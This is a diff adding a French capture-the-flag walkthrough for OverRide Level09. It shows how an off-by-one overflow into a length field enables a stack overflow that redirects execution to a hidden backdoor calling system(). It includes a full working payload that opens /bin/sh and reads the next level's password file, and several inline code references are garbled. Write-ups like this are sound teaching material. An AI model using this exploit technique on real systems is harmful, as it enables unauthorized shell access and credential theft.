@@ -1,0 +1,126 @@
+# Walkthrough du Level09 - OverRide
+
+## Objectif
+
+Obtenir un shell via une faille de débordement dans la structure `s_message` en exploitant une fonction non appelée `secret_backdoor`.
+
+---
+
+## Analyse du programme
+
+Le binaire demande :
+
+- Un **username** (via `set_username`)
+- Un **message** (via `set_msg`)
+
+Il utilise une structure :
+
+```c
+struct s_message {
+    char message[140];       // offset 0
+    char username[40];       // offset 140
+    int len_message;         // offset 180
+};
+```
+
+### Fonction `set_username`
+
+```c
+for (i = 0; i <= 40 && input[i] != '\0'; i++) {
+    msg->username[i] = input[i];
+}
+```
+
+- Boucle de **0 à 40** = **41 itérations** → **overflow de 1 octet** sur `len_message` (situé après `username`)
+
+### Fonction `set_msg`
+
+```c
+strncpy(msg->message, input, msg->len_message);
+```
+
+- `len_message` contrôle la **taille de copie** → si on l'écrase avec `\xff` (255), on déclenche un **débordement** sur la pile.
+
+### Fonction `secret_backdoor`
+
+```c
+void secret_backdoor(void) {
+    char buffer[128];
+    fgets(buffer, 128, stdin);
+    system(buffer);
+}
+```
+
+- Non appelée normalement, mais si on modifie le **retour** de `handle_msg`, elle peut être exécutée.
+
+---
+
+## Plan d'exploitation
+
+1. **Overflow sur **`` avec 1 byte `\xff`
+2. ``** copie 255 octets** → overflow du buffer `message`
+3. **Calcul de l'offset** jusqu'à `RIP`
+4. **Ecrasement de RIP** avec l'adresse de `secret_backdoor`
+
+---
+
+## Détermination de l'offset
+
+On envoie un motif unique de test :
+
+```bash
+r <<< $(echo -ne "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\xff\nAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz")
+```
+
+Puis dans GDB :
+
+```bash
+info registers
+```
+
+Et on regarde la valeur de `RIP`, qu'on cherche dans notre motif pour trouver l'**offset exact** (ex: 200).
+
+---
+
+## Adresse de la backdoor
+
+```bash
+gdb> info functions
+...
+0x000055555555488c  secret_backdoor
+```
+
+On utilisera cette adresse dans notre payload.
+
+---
+
+## Payload final
+
+Payload formaté en ligne de commande :
+
+```bash
+(python -c 'print "B"*40 + "\xff" + "\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n/bin/sh\n"'; cat) | ./level09
+```
+
+---
+
+## Résultat
+
+```bash
+whoami
+level10
+cat /home/users/level10/.pass
+<flag>
+```
+
+---
+
+## Explication de chaque étape
+
+- **40 'B'** : remplissent `username`
+- **+1 **`` : overflow de `len_message`
+- **+200 'B'** : overflow jusqu'à RIP
+- **adresse** : `secret_backdoor()`
+- `` : passé à `system()` dans `secret_backdoor`
+
+---
